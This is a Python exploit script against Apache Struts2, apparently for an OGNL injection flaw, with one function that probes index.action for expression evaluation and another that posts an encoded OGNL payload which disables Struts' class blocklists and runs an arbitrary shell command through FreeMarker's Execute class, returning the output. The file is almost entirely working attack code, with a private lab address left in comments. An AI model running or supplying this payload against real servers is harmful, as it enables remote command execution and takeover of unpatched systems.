import requests
import sys
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def exp_check(url):
    headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0)Gecko/20100101 Firefox/107.0',
               'Cookie': 'JSESSIONID=node01baaem30ruljjhu8tnscji5ep3.node0'}
    c='?id=%25{21*7}'
    # url = sys.argv[1]+'.action'
    # url ='http://192.168.67.134:8080/'
    try:
        url0 = url + '/index.action'
        # print(url0)
        res1 = requests.get(url0+c,headers=headers)
        # print(res1.text)
        if '147' in res1.text:
            return 1
        return 2
    except:
        return 3
def exp_cmd(url,cmd):
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0',
               'Cookie': 'JSESSIONID=48FCD5D2DFB1E3CDF753E62011186CBC',
               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
               'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
               'Content-Type': 'application/x-www-form-urlencoded'}

    # url = 'http://192.168.67.134:8080/'
    # cmd = 'uname'
    data = "id=%25%7B%0A%28%23request.map%3D%23%40org.apache.commons.collections.BeanMap%40%7B%7D%29.toString%28%29.substring%280%2C0%29%20%2B%0A%28%23request.map.setBean%28%23request.get%28%27struts.valueStack%27%29%29%20%3D%3D%20true%29.toString%28%29.substring%280%2C0%29%20%2B%0A%28%23request.map2%3D%23%40org.apache.commons.collections.BeanMap%40%7B%7D%29.toString%28%29.substring%280%2C0%29%20%2B%0A%28%23request.map2.setBean%28%23request.get%28%27map%27%29.get%28%27context%27%29%29%20%3D%3D%20true%29.toString%28%29.substring%280%2C0%29%20%2B%0A%28%23request.map3%3D%23%40org.apache.commons.collections.BeanMap%40%7B%7D%29.toString%28%29.substring%280%2C0%29%20%2B%0A%28%23request.map3.setBean%28%23request.get%28%27map2%27%29.get%28%27memberAccess%27%29%29%20%3D%3D%20true%29.toString%28%29.substring%280%2C0%29%20%2B%0A%28%23request.get%28%27map3%27%29.put%28%27excludedPackageNames%27%2C%23%40org.apache.commons.collections.BeanMap%40%7B%7D.keySet%28%29%29%20%3D%3D%20true%29.toString%28%29.substring%280%2C0%29%20%2B%0A%28%23request.get%28%27map3%27%29.put%28%27excludedClasses%27%2C%23%40org.apache.commons.collections.BeanMap%40%7B%7D.keySet%28%29%29%20%3D%3D%20true%29.toString%28%29.substring%280%2C0%29%20%2B%0A%28%23application.get%28%27org.apache.tomcat.InstanceManager%27%29.newInstance%28%27freemarker.template.utility.Execute%27%29.exec%28%7B%27"+cmd+"%27%7D%29%29%0A%7D"
    # print(data)


    try:
        url0=url+'index.action'
        res2 = requests.post(url0, data=data, headers=headers)
        # print(res2.text)
        string = res2.text
        pattern = r"<a id=\"(.*?)\n\" href="
        # pattern = r"<a id=\"(.*?)\n"
        match = re.search(pattern, string)
        matched_string = match.group(1)
        # print(matched_string)
        return matched_string
    except:
        return 3


if __name__ == '__main__':
    pass
    # url='http://192.168.67.134:8080/'
    # cmd='uname'
    # exp_check(url)
    # print(exp_check(url))
    # exp_cmd(url,cmd)
    #


